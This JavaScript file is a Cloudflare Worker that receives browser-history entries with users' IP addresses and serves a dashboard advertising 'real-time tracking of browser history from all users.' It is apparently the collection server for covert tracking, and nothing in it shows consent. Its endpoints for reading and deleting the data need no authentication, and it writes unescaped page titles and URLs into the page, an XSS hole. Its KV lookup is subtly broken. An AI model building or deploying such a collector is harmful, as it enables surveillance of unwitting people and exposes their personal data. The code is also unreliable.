
// cloudflare-worker.js
export default {
  async fetch(request, env) {
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: corsHeaders,
      });
    }

    const url = new URL(request.url);
    
    // Main endpoint for receiving history
    if (url.pathname === '/history' && request.method === 'POST') {
      try {
        const data = await request.json();
        
        // Validate required fields
        if (!data.url || !data.title) {
          return new Response(
            JSON.stringify({ error: 'Missing required fields' }),
            { 
              status: 400, 
              headers: { 
                'Content-Type': 'application/json',
                ...corsHeaders 
              } 
            }
          );
        }

        // Add timestamp
        const timestamp = new Date().toISOString();
        const historyEntry = {
          ...data,
          timestamp,
          worker_received_at: timestamp,
          user_agent: request.headers.get('User-Agent') || 'Unknown',
        };

        // Store in KV (Cloudflare's key-value store)
        const key = `history_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        if (env.HISTORY_KV) {
          await env.HISTORY_KV.put(key, JSON.stringify(historyEntry));
        }

        // Also store in memory for dashboard (within limits)
        await storeInMemory(historyEntry);

        console.log(`History received: ${historyEntry.title} from IP: ${data.ip_address || 'unknown'}`);

        return new Response(
          JSON.stringify({ 
            success: true, 
            message: 'History saved',
            id: key 
          }),
          { 
            status: 200, 
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );

      } catch (error) {
        console.error('Error processing history:', error);
        return new Response(
          JSON.stringify({ error: 'Internal server error' }),
          { 
            status: 500, 
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );
      }
    }

    // Get all history (for dashboard)
    if (url.pathname === '/history' && request.method === 'GET') {
      try {
        let allHistory = [];
        
        if (env.HISTORY_KV) {
          // Get from KV store
          const keys = await env.HISTORY_KV.list();
          for (const key of keys.keys) {
            const entry = await env.HISTORY_KV.get(key);
            if (entry) {
              allHistory.push(JSON.parse(entry));
            }
          }
        }

        // Sort by timestamp (newest first)
        allHistory.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return new Response(
          JSON.stringify({ 
            success: true, 
            count: allHistory.length,
            history: allHistory.slice(0, 1000) // Limit response
          }),
          { 
            status: 200, 
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );

      } catch (error) {
        console.error('Error fetching history:', error);
        return new Response(
          JSON.stringify({ error: 'Internal server error' }),
          { 
            status: 500, 
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );
      }
    }

    // Dashboard HTML
    if (url.pathname === '/' || url.pathname === '/dashboard') {
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Browser History Dashboard</title>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <script src="https://cdn.tailwindcss.com"></script>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
          <style>
            .fade-in { animation: fadeIn 0.5s ease-in; }
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
          </style>
        </head>
        <body class="bg-gray-50 text-gray-800">
          <div class="container mx-auto px-4 py-8">
            <div class="bg-white rounded-lg shadow-lg p-6 mb-6 fade-in">
              <div class="flex items-center justify-between mb-6">
                <div>
                  <h1 class="text-3xl font-bold text-gray-900">
                    <i class="fas fa-history mr-3 text-blue-500"></i>
                    Browser History Dashboard
                  </h1>
                  <p class="text-gray-600 mt-2">Real-time tracking of browser history from all users</p>
                </div>
                <div class="text-right">
                  <div class="text-sm text-gray-500">Total Entries</div>
                  <div id="totalCount" class="text-3xl font-bold text-blue-600">0</div>
                </div>
              </div>
              
              <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                <div class="bg-blue-50 p-4 rounded-lg">
                  <div class="flex items-center">
                    <i class="fas fa-users text-blue-500 text-2xl mr-3"></i>
                    <div>
                      <div class="text-sm text-gray-600">Unique IPs</div>
                      <div id="uniqueIPs" class="text-xl font-semibold">0</div>
                    </div>
                  </div>
                </div>
                <div class="bg-green-50 p-4 rounded-lg">
                  <div class="flex items-center">
                    <i class="fas fa-globe text-green-500 text-2xl mr-3"></i>
                    <div>
                      <div class="text-sm text-gray-600">Domains</div>
                      <div id="uniqueDomains" class="text-xl font-semibold">0</div>
                    </div>
                  </div>
                </div>
                <div class="bg-purple-50 p-4 rounded-lg">
                  <div class="flex items-center">
                    <i class="fas fa-clock text-purple-500 text-2xl mr-3"></i>
                    <div>
                      <div class="text-sm text-gray-600">Last 24h</div>
                      <div id="last24h" class="text-xl font-semibold">0</div>
                    </div>
                  </div>
                </div>
              </div>

              <div class="flex space-x-2 mb-4">
                <button onclick="loadHistory()" class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-lg flex items-center">
                  <i class="fas fa-sync-alt mr-2"></i> Refresh
                </button>
                <button onclick="exportHistory()" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg flex items-center">
                  <i class="fas fa-download mr-2"></i> Export JSON
                </button>
                <button onclick="clearHistory()" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg flex items-center">
                  <i class="fas fa-trash mr-2"></i> Clear All
                </button>
                <input type="text" id="searchInput" placeholder="Search history..." 
                       class="flex-grow border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500">
              </div>
            </div>

            <div id="historyTable" class="bg-white rounded-lg shadow-lg overflow-hidden fade-in">
              <table class="min-w-full divide-y divide-gray-200">
                <thead class="bg-gray-100">
                  <tr>
                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Time</th>
                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Title</th>
                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">URL</th>
                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">IP Address</th>
                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Browser</th>
                  </tr>
                </thead>
                <tbody id="historyBody" class="bg-white divide-y divide-gray-200">
                  <tr><td colspan="5" class="px-6 py-8 text-center text-gray-500">Loading history...</td></tr>
                </tbody>
              </table>
            </div>

            <div class="mt-6 text-center text-gray-500 text-sm">
              <p>Powered by Cloudflare Workers • Data updates automatically</p>
            </div>
          </div>

          <script>
            let allHistory = [];
            
            async function loadHistory() {
              try {
                const response = await fetch('/history');
                const data = await response.json();
                
                if (data.success) {
                  allHistory = data.history;
                  updateDashboard(data.history);
                }
              } catch (error) {
                console.error('Error loading history:', error);
                document.getElementById('historyBody').innerHTML = 
                  '<tr><td colspan="5" class="px-6 py-8 text-center text-red-500">Error loading history</td></tr>';
              }
            }

            function updateDashboard(history) {
              // Update counters
              document.getElementById('totalCount').textContent = history.length;
              
              const uniqueIPs = new Set(history.map(h => h.ip_address)).size;
              document.getElementById('uniqueIPs').textContent = uniqueIPs;
              
              const uniqueDomains = new Set(history.map(h => {
                try { return new URL(h.url).hostname; } 
                catch { return 'Invalid URL'; }
              })).size;
              document.getElementById('uniqueDomains').textContent = uniqueDomains;
              
              const last24h = history.filter(h => {
                const timeDiff = Date.now() - new Date(h.timestamp).getTime();
                return timeDiff < 24 * 60 * 60 * 1000;
              }).length;
              document.getElementById('last24h').textContent = last24h;

              // Update table
              const tbody = document.getElementById('historyBody');
              tbody.innerHTML = '';
              
              history.slice(0, 100).forEach(entry => {
                const row = document.createElement('tr');
                row.className = 'hover:bg-gray-50';
                
                const time = new Date(entry.timestamp).toLocaleString();
                const domain = new URL(entry.url).hostname;
                const titleShort = entry.title.length > 50 ? entry.title.substring(0, 50) + '...' : entry.title;
                const urlShort = entry.url.length > 60 ? entry.url.substring(0, 60) + '...' : entry.url;
                
                row.innerHTML = \`
                  <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    <div class="font-medium">\${time}</div>
                    <div class="text-gray-500 text-xs">\${domain}</div>
                  </td>
                  <td class="px-6 py-4">
                    <div class="text-sm font-medium text-gray-900">\${titleShort}</div>
                  </td>
                  <td class="px-6 py-4">
                    <a href="\${entry.url}" target="_blank" class="text-sm text-blue-600 hover:text-blue-800 hover:underline">
                      \${urlShort}
                    </a>
                  </td>
                  <td class="px-6 py-4 whitespace-nowrap">
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-gray-100 text-gray-800">
                      \${entry.ip_address || 'Unknown'}
                    </span>
                  </td>
                  <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    \${entry.browser_version || '1.0'}
                  </td>
                \`;
                
                tbody.appendChild(row);
              });
            }

            function exportHistory() {
              const dataStr = JSON.stringify(allHistory, null, 2);
              const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
              
              const exportFileDefaultName = 'browser-history-' + new Date().toISOString().split('T')[0] + '.json';
              
              const linkElement = document.createElement('a');
              linkElement.setAttribute('href', dataUri);
              linkElement.setAttribute('download', exportFileDefaultName);
              linkElement.click();
            }

            async function clearHistory() {
              if (!confirm('Are you sure you want to clear all history? This cannot be undone.')) return;
              
              try {
                const response = await fetch('/clear', { method: 'POST' });
                const data = await response.json();
                
                if (data.success) {
                  alert('History cleared successfully!');
                  loadHistory();
                }
              } catch (error) {
                alert('Error clearing history: ' + error.message);
              }
            }

            // Search functionality
            document.getElementById('searchInput').addEventListener('input', function(e) {
              const searchTerm = e.target.value.toLowerCase();
              if (!searchTerm) {
                updateDashboard(allHistory);
                return;
              }
              
              const filtered = allHistory.filter(entry => 
                entry.title.toLowerCase().includes(searchTerm) ||
                entry.url.toLowerCase().includes(searchTerm) ||
                (entry.ip_address && entry.ip_address.toLowerCase().includes(searchTerm))
              );
              
              updateDashboard(filtered);
            });

            // Auto-refresh every 30 seconds
            loadHistory();
            setInterval(loadHistory, 30000);
          </script>
        </body>
        </html>
      `;

      return new Response(html, {
        headers: {
          'Content-Type': 'text/html;charset=UTF-8',
          ...corsHeaders,
        },
      });
    }

    // Clear history endpoint
    if (url.pathname === '/clear' && request.method === 'POST') {
      if (env.HISTORY_KV) {
        const keys = await env.HISTORY_KV.list();
        for (const key of keys.keys) {
          await env.HISTORY_KV.delete(key);
        }
      }
      
      // Clear in-memory storage
      await clearMemory();
      
      return new Response(
        JSON.stringify({ success: true, message: 'History cleared' }),
        { 
          status: 200, 
          headers: { 
            'Content-Type': 'application/json',
            ...corsHeaders 
          } 
        }
      );
    }

    // 404 for unknown routes
    return new Response('Not Found', { 
      status: 404, 
      headers: { 
        'Content-Type': 'text/plain',
        ...corsHeaders 
      } 
    });
  },
};

// In-memory storage (for dashboard display)
let memoryStorage = [];

async function storeInMemory(entry) {
  memoryStorage.push(entry);
  // Keep only last 1000 entries in memory
  if (memoryStorage.length > 1000) {
    memoryStorage = memoryStorage.slice(-1000);
  }
}

async function clearMemory() {
  memoryStorage = [];
}
